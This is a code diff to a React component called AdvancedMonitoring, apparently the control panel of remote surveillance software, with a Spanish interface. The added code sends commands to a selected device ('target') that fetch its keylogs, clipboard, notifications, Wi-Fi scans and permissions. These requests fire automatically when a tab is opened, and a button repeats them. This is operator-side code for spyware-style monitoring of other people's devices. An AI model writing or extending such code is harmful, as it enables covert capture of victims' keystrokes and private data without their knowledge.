@@ -14,6 +14,7 @@ import {
 } from "lucide-react";
 import { Badge } from "@/components/ui/badge";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { toast } from "sonner";
 
 export default function AdvancedMonitoring() {
   const [selectedDeviceId, setSelectedDeviceId] = useState<number | null>(null);
@@ -48,6 +49,33 @@ export default function AdvancedMonitoring() {
     { deviceId: selectedDeviceId! },
     { enabled: !!selectedDeviceId }
   );
+
+  // Mutations
+  const sendCommand = trpc.devices.sendCommand.useMutation();
+
+  const triggerRefresh = (tab: string) => {
+    if (!selectedDeviceId) return;
+    
+    let command = "";
+    switch(tab) {
+      case "clipboard": command = "get_clipboard"; break;
+      case "notifications": command = "get_notifications"; break;
+      case "wifi": command = "get_wifi_scan"; break;
+      case "keylogger": command = "get_keylogs"; break;
+      case "permissions": command = "get_permissions"; break;
+    }
+
+    if (command) {
+      sendCommand.mutate({ deviceId: selectedDeviceId, command });
+      toast.success(`Solicitando actualización de ${tab}...`);
+    }
+  };
+
+  useEffect(() => {
+    if (selectedDeviceId && activeTab) {
+      triggerRefresh(activeTab);
+    }
+  }, [selectedDeviceId, activeTab]);
 
   const getContentIcon = (type: string) => {
     switch (type) {
@@ -194,12 +222,27 @@ export default function AdvancedMonitoring() {
               <div className="flex-1 min-h-[600px] p-6">
                 {!selectedDeviceId ? (
                   <div className="h-[500px] flex flex-col items-center justify-center text-slate-300">
-                    <Ghost className="w-24 h-24 mb-6 opacity-5" />
-                    <p className="text-sm font-black uppercase tracking-[0.2em]">Esperando Datos...</p>
-                    <p className="text-xs mt-2 font-bold text-slate-400">Selecciona un dispositivo para iniciar</p>
+                    <div className="w-24 h-24 bg-slate-100 rounded-full flex items-center justify-center mb-6 border border-slate-200 shadow-inner">
+                      <Search className="w-12 h-12 text-slate-300" />
+                    </div>
+                    <p className="text-sm font-black uppercase tracking-[0.2em] text-slate-500">Esperando Objetivo...</p>
+                    <p className="text-xs mt-2 font-bold text-slate-400">Selecciona un dispositivo del panel izquierdo para iniciar la auditoría</p>
                   </div>
                 ) : (
                   <>
+                    <div className="flex justify-end mb-4">
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        className="rounded-xl border-accent/20 hover:bg-primary/5 hover:text-primary transition-all font-bold text-[10px] uppercase"
+                        onClick={() => triggerRefresh(activeTab)}
+                        disabled={sendCommand.isPending}
+                      >
+                        <RefreshCw className={`w-3 h-3 mr-2 ${sendCommand.isPending ? "animate-spin" : ""}`} />
+                        Sincronizar Datos {activeTab}
+                      </Button>
+                    </div>
+
                     <TabsContent value="clipboard" className="mt-0 focus-visible:ring-0">
                       <div className="flex items-center justify-between mb-6">
                         <div className="relative flex-1 max-w-md">
